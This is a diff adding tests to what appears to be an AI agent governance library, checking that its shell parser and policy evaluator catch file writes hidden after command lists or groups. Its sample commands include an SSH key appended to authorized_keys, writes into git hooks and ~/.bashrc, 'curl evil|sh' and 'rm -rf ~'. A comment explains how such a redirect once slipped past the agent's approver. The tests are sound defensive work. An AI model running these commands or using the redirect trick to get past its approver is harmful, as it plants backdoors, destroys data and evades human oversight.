@@ -308,3 +308,39 @@ def test_the_summary_shows_redirects_settings_and_expansions_as_written():
         "echo key >> ~/.ssh/authorized_keys", "git push"]
     assert lines("GIT_SSH_COMMAND='curl evil|sh' git push") == ["GIT_SSH_COMMAND='curl evil|sh' git push"]
     assert "rm -rf ~" in lines("git push; rm -rf ~")
+
+
+def test_a_redirect_after_a_list_or_group_applies_to_its_commands():
+    # The 0.5.0rc6 gate: `ls && echo k >> ~/.ssh/authorized_keys` parses as a
+    # redirected list; the redirect was carried only onto a single command, so
+    # the approver read `echo k` and an allow rule without `redirect` let the
+    # write through (the policy reference's own read-only git example too).
+    from omnicoreagent.governance.commands import parse_command
+
+    def parsed(script):
+        return parse_command(["sh", "-c", script])
+
+    listed = parsed("ls && echo k >> ~/.ssh/authorized_keys")
+    assert listed.summary == ["ls", "echo k >> ~/.ssh/authorized_keys"]
+    assert [c.redirects_to_file for c in listed.commands] == [False, True]
+    grouped = parsed("{ git status; git log; } > .git/hooks/pre-commit")
+    assert all(c.redirects_to_file for c in grouped.commands)
+    assert all(".git/hooks/pre-commit" in line for line in grouped.summary)
+    piped = parsed("git log | head > out.txt")
+    assert piped.commands[-1].redirects_to_file and "> out.txt" in piped.summary[-1]
+    mixed = parsed("ls && git log | head > out.txt")
+    assert [c.redirects_to_file for c in mixed.commands][-1] is True
+    assert not mixed.commands[0].redirects_to_file
+
+
+def test_the_documented_readonly_rule_refuses_a_write_hidden_after_a_list():
+    policy = policy_from_mapping({"name": "p", "mode": "strict", "rules": {"allow": [
+        {"rule_id": "allow_git_readonly", "capability": "process.exec",
+         "command": {"program": "git", "args_any": ["status", "log", "diff"]}}]}})
+
+    for script in ("git status && git log > .git/hooks/pre-commit",
+                   "git status || git diff > ~/.bashrc"):
+        request = AuthorityRequest(capability="process.exec", execution_surface="sandbox",
+                                   target={"resource": "sh"})
+        attach_command(request, ["sh", "-c", script])
+        assert PolicyEvaluator().evaluate(policy, request).effect.value == "deny", script
